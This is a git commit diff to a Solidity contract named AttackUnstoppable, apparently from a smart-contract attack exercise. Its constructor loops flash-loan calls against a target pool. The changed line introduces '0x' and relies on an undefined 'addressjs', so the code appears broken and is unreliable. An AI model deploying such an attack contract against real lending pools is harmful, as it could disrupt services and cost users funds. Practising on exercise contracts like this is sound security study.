592939aed747d4c149c46b5ebce806d558eee07e
Dimitris Vagiakakos <50751574+sv1sjp@users.noreply.github.com>
2024-03-27 11:24:02 +0200

    Update AttackUnstoppable.sol

--- Attacking Smart Contracts/AttackUnstoppable.sol
+++ Attacking Smart Contracts/AttackUnstoppable.sol
@@ -5,7 +5,7 @@ contract AttackUnstoppable {
     constructor(address pool_address, address target) {
         // Perform a loop to crate multiple flash loans
         for(uint256 count = 0; count < 10; count++) {
-            IPool(pool_address).flashLoan(target, addressjs, 0, "");
+            IPool(pool_address).flashLoan(target, addressjs, 0x, "");
         }
     }
 }
